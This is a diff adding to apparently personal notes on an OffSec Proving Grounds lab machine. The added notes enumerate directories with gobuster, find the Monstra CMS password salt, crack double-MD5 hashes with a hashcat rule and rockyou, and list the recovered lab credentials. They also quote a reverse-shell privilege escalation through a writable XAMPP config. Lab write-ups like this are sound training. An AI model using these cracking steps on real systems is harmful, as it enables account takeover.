@@ -178,4 +178,59 @@ hashcat -O -m 20 hashes_salted /usr/share/wordlists/rockyou.txt
 ```
 
 Hashcat isn't working. Time to consult a guide.
+
+https://medium.com/@anushka18599/offsec-proving-grounds-walkthrough-monster-774a871c6ad7
+
+Interesting, another person tried:
+
+```sh
+gobuster dir -u http://monster:80/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+```
+
+Okay! So apparently the salt is stored in `C:\xampp\htdocs\blog\boot\defines.php`. It's not those random values above.
+
+https://simpleinfoseccom.wordpress.com/2018/05/27/monstra-cms-3-0-4-unauthenticated-user-credential-exposure/
+
+```php
+*/define('MONSTRA_PASSWORD_SALT', 'YOUR_SALT_HERE');
+
+...
+
+return md5(md5(trim($password) . MONSTRA_PASSWORD_SALT));    }
+```
+
+So, we've got to do a double md5 with hashcat, and change salts.
+
+```bash
+echo '$Y $O $U $R $\x5F $S $A $L $T $\x5F $H $E $R $E' > rule.txt
+
+# double salt with default salt
+echo 'a2b4e80cd640aaa6e417febe095dcbfc' >  hashes_salted2
+echo '844ffc2c7150b93c4133a6ff2e1a2dba' >> hashes_salted2
+hashcat -O -m 2600 hashes_salted2 --wordlist /usr/share/wordlists/rockyou.txt -r rule.txt
+
+hashcat -O -m 2600 hashes_salted2 --wordlist /usr/share/wordlists/rockyou.txt -r rule.txt --show
+# a2b4e80cd640aaa6e417febe095dcbfc:wazowskiYOUR_SALT_HERE  
+# 844ffc2c7150b93c4133a6ff2e1a2dba:Mike14YOUR_SALT_HERE
+```
+
+So, our recovered credentials are:
+
+```
+admin:wazowski
+mike:Mike14
+```
+
+From the lab description,
+
+> Privilege escalation is achieved by exploiting a writable xampp-control.ini file to inject a reverse shell payload, triggered upon interaction with the XAMPP Control Panel by an administrator
+
+Alrighty, great.
+
+Let's RDP as `mike` using Remmina to get our local flag.
+
+
+
+http://monster.pg/dashboard
+
 # Root access
